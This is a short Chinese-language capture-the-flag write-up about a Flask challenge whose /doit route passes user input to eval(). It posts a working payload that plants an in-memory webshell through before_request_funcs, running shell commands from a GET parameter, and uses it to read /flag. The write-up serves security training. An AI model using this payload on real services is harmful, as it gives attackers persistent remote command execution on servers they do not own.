# week 1

## 【这又是什么函数】
先目录扫描发现`/src` 路由，得到源代码
```python
from flask import Flask,request,render_template

app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/doit', methods=['GET', 'POST'])
def doit():
    e=request.form.get('e')
    try:
        eval(e)
        return "done!"
    except Exception as e:
        return "error!"

@app.route('/src', methods=['GET', 'POST'])
def src():
    return open(__file__, encoding="utf-8").read()

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
```
可以看到`/doit` 路由存在`eval` 函数可以执行表达式。这里是无回显的，并且环境不出网，所以我们可以打内存马。 
post传：
```http
e=eval("__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda 
:__import__('os').popen(request.args.get('0')).read())")
```
打入之后会在当前路由加载前执行get传入的命令，我们直接访问当前路由`doit?0=cat /flag` 即可